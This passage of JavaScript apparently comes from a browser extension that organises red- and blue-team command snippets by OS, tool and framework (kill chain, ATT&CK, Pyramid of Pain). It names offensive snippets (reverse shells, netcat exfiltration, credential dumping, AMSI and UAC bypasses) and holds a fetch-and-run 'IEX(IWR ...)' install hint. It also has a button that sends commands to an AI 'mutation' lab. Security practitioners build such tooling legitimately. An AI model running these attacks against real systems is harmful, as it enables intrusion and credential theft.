  //  OS TAGGING — maps snippet id → target OS
  // ═══════════════════════════════════════════════════════════

  const OS_MAP = {
    // Linux-only commands (run ON Linux target or Linux-specific tools)
    'bash-rev': 'linux', 'nc-rev': 'linux', 'python-rev': 'linux',
    'tty-upgrade': 'linux', 'linpeas': 'linux', 'sudo-l': 'linux',
    'find-suid': 'linux', 'persist-cron': 'linux', 'persist-service': 'linux',
    'download-http': 'linux', 'exfil-nc': 'linux', 'exfil-base64': 'linux',
    'netstat-linux': 'linux', 'find-creds': 'linux',
    'ir-collect-linux': 'linux', 'virustotal-hash': 'linux', 'remnux-analysis': 'linux',
    'blue-fw-rules': 'linux', 'blue-fail2ban': 'linux', 'blue-auth-logs': 'linux',
    'blue-process-audit': 'linux', 'blue-cron-audit': 'linux', 'blue-svc-audit': 'linux',
    'blue-network-connections': 'linux', 'blue-dns-monitor': 'linux',
    'blue-hash-check': 'linux', 'blue-user-audit': 'linux',
    'listener-rlwrap': 'linux', 'ldapsearch': 'linux',
    // Receivers (mostly cross-platform, some Linux)
    'dns-listener': 'linux', 'smtp-receiver': 'linux',
    'responder-http': 'linux',
    // Wireless (Linux — needs monitor mode)
    'airmon-start': 'linux', 'airodump': 'linux', 'aireplay-deauth': 'linux',
    'bettercap-wifi': 'linux', 'wifite': 'linux', 'eaphammer': 'linux',
    // Windows-only commands (run ON Windows target or Windows-specific)
    'powershell-rev': 'windows', 'winpeas': 'windows',
    'persist-schtask': 'windows', 'upload-certutil': 'windows',
    'upload-powershell': 'windows', 'netstat-windows': 'windows',
    'ir-collect-windows': 'windows', 'mimikatz-logonpasswords': 'windows',
    'blue-schtask-audit': 'windows', 'blue-windows-events': 'windows',
    // Windows post-exploitation
    'win-sysinfo': 'windows', 'win-powerview': 'windows', 'win-rubeus': 'windows',
    'win-sharphound': 'windows', 'win-token-impersonate': 'windows',
    'win-sam-dump': 'windows', 'win-dpapi': 'windows',
    'win-amsi-bypass': 'windows', 'win-uac-bypass': 'windows',
    // Mobile (mostly cross-platform tools, ADB = Linux/Mac primary)
    'adb-devices': 'linux', 'adb-shell': 'linux',
  };

  SNIPPETS.forEach(s => { s.os = OS_MAP[s.id] || 'all'; });

  // ═══════════════════════════════════════════════════════════
  //  TOOL REGISTRY — canonical tool list with install hints
  // ═══════════════════════════════════════════════════════════

  const TOOL_REGISTRY = [
    // Recon
    { id: 'nmap',           label: 'Nmap',              cat: 'recon',     install: 'apt install nmap / choco install nmap / brew install nmap' },
    { id: 'whatweb',        label: 'WhatWeb',            cat: 'recon',     install: 'apt install whatweb / gem install whatweb' },
    { id: 'amass',          label: 'Amass',              cat: 'recon',     install: 'go install github.com/owasp-amass/amass/v4/...@master' },
    { id: 'subfinder',      label: 'Subfinder',          cat: 'recon',     install: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest' },
    { id: 'theharvester',   label: 'theHarvester',       cat: 'recon',     install: 'pip install theHarvester' },
    { id: 'shodan',         label: 'Shodan CLI',         cat: 'recon',     install: 'pip install shodan' },
    { id: 'nuclei',         label: 'Nuclei',             cat: 'recon',     install: 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest' },
    // Web
    { id: 'ffuf',           label: 'ffuf',               cat: 'web',       install: 'go install github.com/ffuf/ffuf/v2@latest' },
    { id: 'gobuster',       label: 'Gobuster',           cat: 'web',       install: 'go install github.com/OJ/gobuster/v3@latest' },
    { id: 'feroxbuster',    label: 'Feroxbuster',        cat: 'web',       install: 'apt install feroxbuster / cargo install feroxbuster' },
    { id: 'nikto',          label: 'Nikto',              cat: 'web',       install: 'apt install nikto' },
    { id: 'sqlmap',         label: 'SQLMap',             cat: 'web',       install: 'apt install sqlmap / pip install sqlmap' },
    { id: 'wfuzz',          label: 'Wfuzz',              cat: 'web',       install: 'pip install wfuzz' },
    { id: 'wpscan',         label: 'WPScan',             cat: 'web',       install: 'gem install wpscan' },
    // Passwords
    { id: 'hydra',          label: 'Hydra',              cat: 'passwords', install: 'apt install hydra' },
    { id: 'hashcat',        label: 'Hashcat',            cat: 'passwords', install: 'apt install hashcat / choco install hashcat' },
    { id: 'john',           label: 'John the Ripper',    cat: 'passwords', install: 'apt install john' },
    { id: 'crackmapexec',   label: 'CrackMapExec',       cat: 'passwords', install: 'pip install crackmapexec' },
    // AD / Lateral
    { id: 'bloodhound',     label: 'BloodHound',         cat: 'ad',        install: 'pip install bloodhound' },
    { id: 'impacket',       label: 'Impacket',           cat: 'ad',        install: 'pip install impacket' },
    { id: 'evil-winrm',     label: 'Evil-WinRM',         cat: 'ad',        install: 'gem install evil-winrm' },
    { id: 'kerbrute',       label: 'Kerbrute',           cat: 'ad',        install: 'go install github.com/ropnop/kerbrute@latest' },
    { id: 'enum4linux',     label: 'Enum4Linux-ng',      cat: 'ad',        install: 'pip install enum4linux-ng' },
    { id: 'responder',      label: 'Responder',          cat: 'ad',        install: 'apt install responder / pip install Responder' },
    { id: 'mimikatz',       label: 'Mimikatz',           cat: 'ad',        install: 'Download from github.com/gentilkiwi/mimikatz' },
    // Tunneling
    { id: 'chisel',         label: 'Chisel',             cat: 'tunnel',    install: 'go install github.com/jpillora/chisel@latest' },
    { id: 'socat',          label: 'Socat',              cat: 'tunnel',    install: 'apt install socat' },
    { id: 'ligolo',         label: 'Ligolo-ng',          cat: 'tunnel',    install: 'go install github.com/nicocha30/ligolo-ng@latest' },
    // Payloads
    { id: 'msfvenom',       label: 'Msfvenom',           cat: 'payloads',  install: 'apt install metasploit-framework' },
    { id: 'metasploit',     label: 'Metasploit',         cat: 'payloads',  install: 'apt install metasploit-framework' },
    // Forensics / Blue
    { id: 'volatility',     label: 'Volatility 3',       cat: 'forensics', install: 'pip install volatility3' },
    { id: 'autopsy',        label: 'Autopsy / TSK',      cat: 'forensics', install: 'apt install sleuthkit' },
    { id: 'yara',           label: 'YARA',               cat: 'malware',   install: 'apt install yara / pip install yara-python' },
    { id: 'cuckoo',         label: 'Cuckoo Sandbox',     cat: 'malware',   install: 'pip install cuckoo' },
    // OSINT
    { id: 'recon-ng',       label: 'Recon-ng',           cat: 'osint',     install: 'pip install recon-ng' },
    { id: 'spiderfoot',     label: 'SpiderFoot',         cat: 'osint',     install: 'pip install spiderfoot' },
    { id: 'maltego',        label: 'Maltego CE',         cat: 'osint',     install: 'Download from maltego.com' },
    { id: 'dnsenum',        label: 'DNSenum',            cat: 'osint',     install: 'apt install dnsenum' },
    // Hardening / DAST
    { id: 'semgrep',        label: 'Semgrep',            cat: 'hardening', install: 'pip install semgrep' },
    { id: 'trivy',          label: 'Trivy',              cat: 'hardening', install: 'apt install trivy / brew install trivy' },
    { id: 'zap',            label: 'OWASP ZAP',          cat: 'hardening', install: 'Download from zaproxy.org / docker pull zaproxy/zap-stable' },
    { id: 'dependency-check', label: 'Dep-Check',        cat: 'hardening', install: 'Download from owasp.org/dependency-check' },
    // Cloud
    { id: 'aws',            label: 'AWS CLI',            cat: 'cloud',     install: 'pip install awscli / brew install awscli' },
    { id: 'prowler',        label: 'Prowler',            cat: 'cloud',     install: 'pip install prowler' },
    { id: 'scoutsuite',     label: 'ScoutSuite',         cat: 'cloud',     install: 'pip install scoutsuite' },
    { id: 'pacu',           label: 'Pacu (AWS exploit)', cat: 'cloud',     install: 'pip install pacu' },
    // Wireless
    { id: 'aircrack-ng',    label: 'Aircrack-ng Suite',  cat: 'wireless',  install: 'apt install aircrack-ng' },
    { id: 'bettercap',      label: 'Bettercap',          cat: 'wireless',  install: 'apt install bettercap / brew install bettercap' },
    { id: 'wifite',         label: 'Wifite',             cat: 'wireless',  install: 'apt install wifite' },
    { id: 'eaphammer',      label: 'EAPHammer',          cat: 'wireless',  install: 'github.com/s0lst1c3/eaphammer' },
    // Social Engineering
    { id: 'gophish',        label: 'GoPhish',            cat: 'social',    install: 'github.com/gophish/gophish/releases' },
    { id: 'setoolkit',      label: 'SET Toolkit',        cat: 'social',    install: 'apt install set' },
    { id: 'evilginx',       label: 'Evilginx2',         cat: 'social',    install: 'go install github.com/kgretzky/evilginx2@latest' },
    { id: 'swaks',          label: 'Swaks',              cat: 'social',    install: 'apt install swaks' },
    // Windows Post-Exploit
    { id: 'rubeus',         label: 'Rubeus',             cat: 'winpost',   install: 'github.com/GhostPack/Rubeus (compile)' },
    { id: 'sharphound',     label: 'SharpHound',         cat: 'winpost',   install: 'github.com/BloodHoundAD/SharpHound' },
    { id: 'powerview',      label: 'PowerView',          cat: 'winpost',   install: 'IEX(IWR .../PowerView.ps1)' },
    // Receivers
    { id: 'updog',          label: 'Updog',              cat: 'receivers', install: 'pip install updog' },
    { id: 'interactsh',     label: 'Interactsh',         cat: 'receivers', install: 'go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest' },
    { id: 'ngrok',          label: 'Ngrok',              cat: 'receivers', install: 'Download from ngrok.com / snap install ngrok' },
    { id: 'webdav',         label: 'WsgiDAV',            cat: 'receivers', install: 'pip install wsgidav cheroot' },
    { id: 'dnscat2',        label: 'dnscat2',            cat: 'receivers', install: 'gem install dnscat2 / github.com/iagox86/dnscat2' },
    // Mobile
    { id: 'adb',            label: 'ADB',                cat: 'mobile',    install: 'apt install adb / brew install android-platform-tools' },
    { id: 'apktool',        label: 'Apktool',            cat: 'mobile',    install: 'apt install apktool / brew install apktool' },
    { id: 'jadx',           label: 'JADX',               cat: 'mobile',    install: 'github.com/skylot/jadx/releases' },
    { id: 'frida',          label: 'Frida',              cat: 'mobile',    install: 'pip install frida-tools' },
    { id: 'objection',      label: 'Objection',          cat: 'mobile',    install: 'pip install objection' },
    { id: 'mobsf',          label: 'MobSF',              cat: 'mobile',    install: 'docker pull opensecurity/mobile-security-framework-mobsf' },
    // Container Defense
    { id: 'grype',          label: 'Grype',              cat: 'container', install: 'curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh' },
    { id: 'falco',          label: 'Falco',              cat: 'container', install: 'docker pull falcosecurity/falco' },
    { id: 'kubescape',      label: 'Kubescape',          cat: 'container', install: 'curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | bash' },
    { id: 'cosign',         label: 'Cosign',             cat: 'container', install: 'go install github.com/sigstore/cosign/v2/cmd/cosign@latest' },
    // Common utils
    { id: 'nc',             label: 'Netcat',             cat: 'util',      install: 'apt install netcat / ncat (from nmap)' },
    { id: 'rlwrap',         label: 'rlwrap',             cat: 'util',      install: 'apt install rlwrap' },
    { id: 'fail2ban',       label: 'Fail2ban',           cat: 'defense',   install: 'apt install fail2ban' },
    { id: 'thehive',        label: 'TheHive',            cat: 'ir',        install: 'https://docs.strangebee.com' },
    { id: 'ssh',            label: 'SSH',                cat: 'util',      install: 'Built-in (OpenSSH)' },
    { id: 'curl',           label: 'cURL',               cat: 'util',      install: 'apt install curl / built-in (macOS, most Linux)' },
  ];

  // Build a lookup: tool id → registry entry
  const TOOL_LOOKUP = Object.fromEntries(TOOL_REGISTRY.map(t => [t.id, t]));

  // Map each snippet to its primary tool (first tag that matches the registry)
  function snippetPrimaryTool(snippet) {
    for (const tag of snippet.tags) {
      const norm = tag.toLowerCase().replace(/[^a-z0-9-]/g, '');
      if (TOOL_LOOKUP[norm]) return norm;
    }
    return null;
  }

  // Notion-synced snippets loaded from storage
  let notionSnippets = [];

  function getAllSnippets() {
    return [...SNIPPETS, ...notionSnippets];
  }

  // ═══════════════════════════════════════════════════════════
  //  STATE
  // ═══════════════════════════════════════════════════════════

  const state = {
    search: '', category: 'all', team: 'all',
    os: 'all',              // 'all' | 'linux' | 'windows' | 'macos'
    installedTools: new Set(), // tool IDs the user has checked
    filterByTools: false,   // when true, dim/hide snippets needing unavailable tools
    favorites: new Set(),   // snippet IDs the user has starred
    target: '', lhost: '10.10.14.7', lport: '4444',
    domain: '', user: '', pass: '',
    activeKcPhase: null, activeAttackTactic: null,
    activePyramidLevel: null, activeOwaspCategory: null,
  };

  // ═══════════════════════════════════════════════════════════
  //  HELPERS
  // ═══════════════════════════════════════════════════════════

  function sanitize(v) { return String(v || '').replace(/[^\w.\-:/]/g, '').trim(); }

  // OS filter: 'all' shows everything; a specific OS shows 'all' + that OS + multi-OS
  function matchesOs(snippet) {
    if (state.os === 'all') return true;
    // Multi-OS snippets always match (they have a variant for the selected OS)
    if (snippet.commands && snippet.commands[state.os]) return true;
    const s = snippet.os || 'all';
    return s === 'all' || s === state.os;
  }

  // Tool filter: returns true if snippet's primary tool is installed (or no filter active)
  function matchesTools(snippet) {
    if (!state.filterByTools) return true;
    const tool = snippetPrimaryTool(snippet);
    if (!tool) return true; // no known tool → always show
    return state.installedTools.has(tool);
  }

  function renderCmd(cmd) {
    return cmd
      .replaceAll('LHOST', state.lhost || 'LHOST')
      .replaceAll('LPORT', state.lport || 'LPORT')
      .replaceAll('DOMAIN', state.domain || 'DOMAIN')
      .replaceAll('USER', state.user || 'USER')
      .replaceAll('PASS', state.pass || 'PASS')
      .replaceAll('NTHASH', 'NTHASH')
      .replaceAll('TARGET', state.target || 'TARGET');
  }

  // Resolve the best command for a snippet, preferring OS-variant if available
  function resolveCommand(item) {
    if (item.commands && state.os !== 'all' && item.commands[state.os]) {
      return item.commands[state.os];
    }
    return item.command;
  }

  function makeCard(item) {
    const card = document.createElement('article');
    card.className = 'card';
    const rendered = renderCmd(resolveCommand(item));

    // Dim if tool not installed and filter active
    const primaryTool = snippetPrimaryTool(item);
    const toolAvailable = !primaryTool || state.installedTools.has(primaryTool);
    if (state.filterByTools && !toolAvailable) card.classList.add('dimmed');

    // Favorite star
    const favBtn = document.createElement('button');
    favBtn.className = 'fav-btn' + (state.favorites.has(item.id) ? ' active' : '');
    favBtn.textContent = state.favorites.has(item.id) ? '\u2605' : '\u2606';
    favBtn.title = state.favorites.has(item.id) ? 'Remove from favorites' : 'Add to favorites';
    favBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (state.favorites.has(item.id)) {
        state.favorites.delete(item.id);
        favBtn.classList.remove('active');
        favBtn.textContent = '\u2606';
        favBtn.title = 'Add to favorites';
      } else {
        state.favorites.add(item.id);
        favBtn.classList.add('active');
        favBtn.textContent = '\u2605';
        favBtn.title = 'Remove from favorites';
      }
      saveFavorites();
      renderFavoritesStrip();
    });

    const head = document.createElement('div');
    head.className = 'card-head';
    const title = document.createElement('span');
    title.className = 'card-title';
    title.textContent = item.title;

    // OS badge — single OS or multi-OS indicator
    const hasVariants = item.commands && Object.keys(item.commands).length > 1;
    const itemOs = item.os || 'all';
    if (hasVariants) {
      const osBadge = document.createElement('span');
      osBadge.className = 'card-os-badge';
      osBadge.style.cssText = 'background:rgba(51,209,122,0.15);color:var(--co-green);';
      const activeOs = state.os !== 'all' ? state.os : 'multi';
      osBadge.textContent = activeOs === 'multi' ? 'Multi-OS' : (activeOs === 'linux' ? 'Linux' : activeOs === 'windows' ? 'Win' : 'macOS');
      title.appendChild(document.createTextNode(' '));
      title.appendChild(osBadge);
    } else if (itemOs !== 'all') {
      const osBadge = document.createElement('span');
      osBadge.className = 'card-os-badge ' + itemOs;
      osBadge.textContent = itemOs === 'linux' ? 'Linux' : itemOs === 'windows' ? 'Win' : 'macOS';
      title.appendChild(document.createTextNode(' '));
      title.appendChild(osBadge);
    }

    // Tool missing badge
    if (primaryTool && !toolAvailable) {
      const missingBadge = document.createElement('span');
      missingBadge.className = 'card-tool-missing';
      const reg = TOOL_LOOKUP[primaryTool];
      missingBadge.textContent = 'needs ' + (reg ? reg.label : primaryTool);
      missingBadge.title = reg ? 'Install: ' + reg.install : '';
      title.appendChild(document.createTextNode(' '));
      title.appendChild(missingBadge);
    }

    const cat = document.createElement('span');
    cat.className = 'card-cat ' + item.team;
    cat.textContent = (item.team === 'red' ? 'RED' : 'BLUE') + ' / ' + item.category;
    head.appendChild(favBtn);
    head.appendChild(title);
    head.appendChild(cat);

    const desc = document.createElement('div');
    desc.className = 'card-desc';
    desc.textContent = item.description;

    const cmd = document.createElement('pre');
    cmd.className = 'card-cmd';
    cmd.textContent = rendered;

    const actions = document.createElement('div');
    actions.className = 'card-actions';
    const tags = document.createElement('span');
    tags.className = 'card-tags';
    const tagParts = [...item.tags];
    if (item.owasp && item.owasp.length) tagParts.push(...item.owasp);
    tags.textContent = tagParts.join(', ');
    const copyBtn = document.createElement('button');
    copyBtn.className = 'copy-btn';
    copyBtn.textContent = 'Copy';
    copyBtn.addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(rendered);
        copyBtn.textContent = 'Copied';
        copyBtn.classList.add('ok');
        setTimeout(() => { copyBtn.textContent = 'Copy'; copyBtn.classList.remove('ok'); }, 1200);
      } catch { copyBtn.textContent = 'Failed'; }
    });
    const mutateBtn = document.createElement('button');
    mutateBtn.className = 'copy-btn';
    mutateBtn.textContent = 'Mutate';
    mutateBtn.title = 'Send to AI Red Team Mutation Lab';
    mutateBtn.addEventListener('click', () => {
      // Open AI Red Team with mutation tab and pre-filled command
      const url = chrome.runtime.getURL('ai-hub/ai-redteam.html') + '#mutation';
      chrome.storage.local.set({ aiRedTeamPrefill: rendered }, () => {
        window.open(url, '_blank');
      });
    });
    actions.appendChild(tags);
    actions.appendChild(copyBtn);
    actions.appendChild(mutateBtn);

    card.appendChild(head);
    card.appendChild(desc);
    card.appendChild(cmd);
    card.appendChild(actions);
    return card;
  }

  // ═══════════════════════════════════════════════════════════
  //  GLOBAL VARIABLE BAR — wired to all views
  // ═══════════════════════════════════════════════════════════

  function initVarBar() {
    const varInputs = {
      target: document.getElementById('globalTarget'),
      lhost: document.getElementById('globalLhost'),
      lport: document.getElementById('globalLport'),
      domain: document.getElementById('globalDomain'),
      user: document.getElementById('globalUser'),
      pass: document.getElementById('globalPass'),
    };

    // Load saved vars from storage
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsVars'], (result) => {
        const saved = result.cyberOpsVars || {};
        if (saved.target) { state.target = saved.target; varInputs.target.value = saved.target; }
        if (saved.lhost) { state.lhost = saved.lhost; varInputs.lhost.value = saved.lhost; }
        if (saved.lport) { state.lport = saved.lport; varInputs.lport.value = saved.lport; }
        if (saved.domain) { state.domain = saved.domain; varInputs.domain.value = saved.domain; }
        if (saved.user) { state.user = saved.user; varInputs.user.value = saved.user; }
        if (saved.pass) { state.pass = saved.pass; varInputs.pass.value = saved.pass; }
        refreshAllViews();
      });
    }

    function saveVars() {
      if (typeof chrome !== 'undefined' && chrome.storage) {
        chrome.storage.local.set({ cyberOpsVars: {
          target: state.target, lhost: state.lhost, lport: state.lport,
          domain: state.domain, user: state.user, pass: state.pass,
        }});
      }
    }

    function bindVar(el, key) {
      el.addEventListener('input', () => {
        state[key] = key === 'target' ? sanitize(el.value) || '' : el.value.trim();
        saveVars();
        refreshAllViews();
      });
    }

    bindVar(varInputs.target, 'target');
    bindVar(varInputs.lhost, 'lhost');
    bindVar(varInputs.lport, 'lport');
    bindVar(varInputs.domain, 'domain');
    bindVar(varInputs.user, 'user');
    bindVar(varInputs.pass, 'pass');
  }

  // ═══════════════════════════════════════════════════════════
  //  OS SELECTOR — wired to refresh all views
  // ═══════════════════════════════════════════════════════════

  function initOsSelector() {
    const group = document.getElementById('osGroup');
    if (!group) return;

    // Load saved OS
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsOs'], (result) => {
        if (result.cyberOpsOs) {
          state.os = result.cyberOpsOs;
          group.querySelectorAll('.os-btn').forEach(b => {
            b.classList.toggle('active', b.dataset.os === state.os);
          });
          refreshAllViews();
        }
      });
    }

    group.querySelectorAll('.os-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        state.os = btn.dataset.os;
        group.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if (typeof chrome !== 'undefined' && chrome.storage) {
          chrome.storage.local.set({ cyberOpsOs: state.os });
        }
        // Reinit frameworks so counts update
        initKillChain();
        initAttackMatrix();
        initPyramid();
        initOwasp();
        renderSnippets();
      });
    });
  }

  // ═══════════════════════════════════════════════════════════
  //  TOOL INVENTORY — checkable list, stored in chrome.storage
  // ═══════════════════════════════════════════════════════════

  function initToolInventory() {
    const toggleBtn = document.getElementById('toolsToggleBtn');
    const panel = document.getElementById('toolsPanel');
    const grid = document.getElementById('toolsGrid');
    const selectAllBtn = document.getElementById('toolsSelectAll');
    const selectNoneBtn = document.getElementById('toolsSelectNone');
    const filterToggle = document.getElementById('toolsFilterToggle');
    if (!toggleBtn || !panel || !grid) return;

    // Toggle panel
    toggleBtn.addEventListener('click', () => {
      panel.classList.toggle('open');
      toggleBtn.textContent = panel.classList.contains('open') ? 'Hide Tools' : 'Tools';
    });

    // Build grid of checkboxes
    function renderToolGrid() {
      grid.innerHTML = '';
      // Group by category
      const cats = [...new Set(TOOL_REGISTRY.map(t => t.cat))];
      cats.forEach(cat => {
        const tools = TOOL_REGISTRY.filter(t => t.cat === cat);
        tools.forEach(tool => {
          const item = document.createElement('label');
          item.className = 'tool-item' + (state.installedTools.has(tool.id) ? ' checked' : '');
          item.title = tool.install;

          const cb = document.createElement('input');
          cb.type = 'checkbox';
          cb.checked = state.installedTools.has(tool.id);
          cb.addEventListener('change', () => {
            if (cb.checked) state.installedTools.add(tool.id);
            else state.installedTools.delete(tool.id);
            item.classList.toggle('checked', cb.checked);
            saveToolInventory();
            refreshAllViews();
          });

          const label = document.createElement('span');
          label.textContent = tool.label;

          const catLabel = document.createElement('span');
          catLabel.className = 'tool-cat';
          catLabel.textContent = cat;

          item.appendChild(cb);
          item.appendChild(label);
          item.appendChild(catLabel);
          grid.appendChild(item);
        });
      });
    }

    // Select all / none
    selectAllBtn.addEventListener('click', () => {
      state.installedTools = new Set(TOOL_REGISTRY.map(t => t.id));
      saveToolInventory();
      renderToolGrid();
      refreshAllViews();
    });

    selectNoneBtn.addEventListener('click', () => {
      state.installedTools = new Set();
      saveToolInventory();
      renderToolGrid();
      refreshAllViews();
    });

    // Filter toggle
    filterToggle.addEventListener('click', () => {
      state.filterByTools = !state.filterByTools;
      filterToggle.classList.toggle('active', state.filterByTools);
      filterToggle.textContent = state.filterByTools ? 'Show All' : 'Hide Unavailable';
      if (typeof chrome !== 'undefined' && chrome.storage) {
        chrome.storage.local.set({ cyberOpsFilterByTools: state.filterByTools });
      }
      refreshAllViews();
    });

    // Load saved inventory
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsInstalledTools', 'cyberOpsFilterByTools'], (result) => {
        if (result.cyberOpsInstalledTools && Array.isArray(result.cyberOpsInstalledTools)) {
          state.installedTools = new Set(result.cyberOpsInstalledTools);
        }
        if (result.cyberOpsFilterByTools) {
          state.filterByTools = true;
          filterToggle.classList.add('active');
          filterToggle.textContent = 'Show All';
        }
        renderToolGrid();
        refreshAllViews();
      });
    } else {
      renderToolGrid();
    }
  }

  function saveToolInventory() {
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.set({ cyberOpsInstalledTools: [...state.installedTools] });
    }
  }

  function refreshAllViews() {
    // Refresh whichever detail panel is currently visible
    if (state.activeKcPhase) {
      const phase = KILL_CHAIN.find(p => p.id === state.activeKcPhase);
      if (phase) renderKcDetail(phase);
    }
    if (state.activeAttackTactic) {
      const tactic = ATTACK_TACTICS.find(t => t.id === state.activeAttackTactic);
      if (tactic) renderAttackDetail(tactic);
    }
    if (state.activePyramidLevel) {
      const level = PYRAMID_LEVELS.find(l => l.id === state.activePyramidLevel);
      if (level) renderPyramidDetail(level);
    }
    if (state.activeOwaspCategory) {
      const cat = OWASP_TOP10.find(c => c.id === state.activeOwaspCategory);
      if (cat) renderOwaspDetail(cat);
    }
    renderSnippets();
    renderFavoritesStrip();
    updateStatsBar();
  }

  // ═══════════════════════════════════════════════════════════
  //  FRAMEWORK TABS
  // ═══════════════════════════════════════════════════════════

  document.querySelectorAll('.fw-tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.fw-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.fw-panel').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      document.querySelector(`.fw-panel[data-fw="${tab.dataset.fw}"]`).classList.add('active');
    });
  });

  // ═══════════════════════════════════════════════════════════
  //  KILL CHAIN
  // ═══════════════════════════════════════════════════════════

  function initKillChain() {
    const container = document.getElementById('kcChain');
    container.innerHTML = '';

    KILL_CHAIN.forEach(phase => {
      const all = getAllSnippets();
      const items = all.filter(s => s.killchain === phase.id && matchesOs(s));

      const el = document.createElement('div');
      el.className = 'kc-phase';
      el.dataset.phase = phase.id;

      const head = document.createElement('div');
      head.className = 'kc-phase-head';
      head.innerHTML = `${phase.label}<span class="kc-phase-count">${items.length} tools</span>`;

      const body = document.createElement('div');
      body.className = 'kc-phase-body';

      items.slice(0, 6).forEach(item => {
        const tag = document.createElement('span');
        tag.className = 'kc-mini-tag ' + item.team;
        tag.textContent = item.title.length > 18 ? item.title.substring(0, 16) + '..' : item.title;
        tag.title = item.title;
        body.appendChild(tag);
      });

      if (items.length > 6) {
        const more = document.createElement('span');
        more.className = 'kc-mini-tag';
        more.textContent = `+${items.length - 6} more`;
        body.appendChild(more);
      }

      el.appendChild(head);
      el.appendChild(body);
      container.appendChild(el);

      el.addEventListener('click', () => {
        state.activeKcPhase = phase.id;
        document.querySelectorAll('.kc-phase').forEach(p => p.classList.remove('active'));
        el.classList.add('active');
        renderKcDetail(phase);
      });
    });

    const firstPhase = container.querySelector('.kc-phase');
    if (firstPhase) firstPhase.click();
  }

  function renderKcDetail(phase) {
    const container = document.getElementById('kcDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.killchain === phase.id && matchesOs(s));
    const redItems = items.filter(s => s.team === 'red');
    const blueItems = items.filter(s => s.team === 'blue');

    container.innerHTML = '';

    const header = document.createElement('div');
    header.className = 'phase-detail-header';
    header.style.padding = '16px 24px 0';
    header.innerHTML = `
      <h2>${phase.label}</h2>
      <span class="team-label red">${redItems.length} Red</span>
      <span class="team-label blue">${blueItems.length} Blue</span>
      <span style="color:var(--co-text-muted);font-size:13px;margin-left:8px;">${phase.desc}</span>`;
    container.appendChild(header);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    [...redItems, ...blueItems].forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);

    if (items.length === 0) {
      container.insertAdjacentHTML('beforeend', '<div class="empty">No tools mapped to this phase yet.</div>');
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  MITRE ATT&CK
  // ═══════════════════════════════════════════════════════════

  function initAttackMatrix() {
    const container = document.getElementById('attackMatrix');
    container.innerHTML = '';

    const grid = document.createElement('div');
    grid.className = 'attack-grid';

    ATTACK_TACTICS.forEach(tactic => {
      const all = getAllSnippets();
      const items = all.filter(s => s.attack.includes(tactic.id) && matchesOs(s));

      const col = document.createElement('div');

      const header = document.createElement('div');
      header.className = 'attack-tactic';
      header.dataset.tactic = tactic.id;
      header.innerHTML = `<span class="attack-count">${items.length}</span>${tactic.label}`;
      header.addEventListener('click', () => {
        state.activeAttackTactic = tactic.id;
        document.querySelectorAll('.attack-tactic').forEach(t => t.classList.remove('active'));
        header.classList.add('active');
        renderAttackDetail(tactic);
      });

      const techniques = document.createElement('div');
      techniques.className = 'attack-techniques';
      items.slice(0, 5).forEach(item => {
        const el = document.createElement('div');
        el.className = 'attack-tech-item ' + item.team;
        el.textContent = item.title;
        el.title = item.description;
        techniques.appendChild(el);
      });
      if (items.length > 5) {
        const more = document.createElement('div');
        more.className = 'attack-tech-item';
        more.textContent = `+${items.length - 5} more`;
        more.style.fontStyle = 'italic';
        techniques.appendChild(more);
      }

      col.appendChild(header);
      col.appendChild(techniques);
      grid.appendChild(col);
    });

    container.appendChild(grid);
  }

  function renderAttackDetail(tactic) {
    const container = document.getElementById('attackDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.attack.includes(tactic.id) && matchesOs(s));

    container.innerHTML = '';
    const header = document.createElement('div');
    header.className = 'phase-detail-header';
    header.style.padding = '16px 24px 0';
    header.innerHTML = `<h2>${tactic.label}</h2><span class="badge">${tactic.code}</span><span style="margin-left:8px;color:var(--co-text-muted);font-size:13px;">${items.length} techniques mapped</span>`;
    container.appendChild(header);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
    items.forEach(item => grid.appendChild(makeCard(item)));
    container.appendChild(grid);
  }

  // ═══════════════════════════════════════════════════════════
  //  PYRAMID OF PAIN
  // ═══════════════════════════════════════════════════════════

  function initPyramid() {
    const container = document.getElementById('pyramidWrap');
    container.innerHTML = '';

    PYRAMID_LEVELS.forEach(level => {
      const all = getAllSnippets();
      const items = all.filter(s => s.pyramid === level.id && matchesOs(s));

      const el = document.createElement('div');
      el.className = 'pyramid-level';
      el.dataset.level = level.id;

      const pain = document.createElement('span');
      pain.className = 'pyramid-pain ' + level.painClass;
      pain.textContent = level.pain;

      const label = document.createElement('span');
      label.className = 'pyramid-label';
      label.textContent = level.label;

      const count = document.createElement('span');
      count.className = 'badge';
      count.textContent = `${items.length} tools`;

      el.appendChild(pain);
      el.appendChild(label);
      el.appendChild(count);
      container.appendChild(el);

      el.addEventListener('click', () => {
        state.activePyramidLevel = level.id;
        document.querySelectorAll('.pyramid-level').forEach(l => l.classList.remove('active'));
        el.classList.add('active');
        renderPyramidDetail(level);
      });
    });
  }

  function renderPyramidDetail(level) {
    const container = document.getElementById('pyramidDetail');
    const all = getAllSnippets();
    const items = all.filter(s => s.pyramid === level.id && matchesOs(s));

    container.innerHTML = '';

    const info = document.createElement('div');
    info.className = 'fw-info';
    info.innerHTML = `<strong>${level.label}</strong> — ${level.desc}`;
    container.appendChild(info);

    const grid = document.createElement('div');
    grid.className = 'snippet-grid';
